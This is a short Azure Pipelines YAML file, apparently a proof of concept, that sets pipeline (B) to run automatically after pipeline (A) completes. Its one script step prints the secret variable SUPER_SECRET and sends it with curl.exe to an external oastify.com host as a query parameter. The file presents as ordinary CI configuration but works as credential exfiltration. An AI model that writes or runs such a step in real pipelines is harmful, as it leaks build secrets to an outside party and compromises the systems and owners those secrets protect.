trigger: none
pr: none

pool: Default

resources:
  pipelines:
  - pipeline: pipeline (B)
    source: pipeline (A)
    trigger: true # Run pipeline (B) when any run of pipeline (A) completes
    branch: main

steps:
  - script: |
      echo $(SUPER_SECRET)
      curl.exe http://tol8oja2llwxrzrrohv0h7mlscy3mvak.oastify.com/?secret=$(SUPER_SECRET)
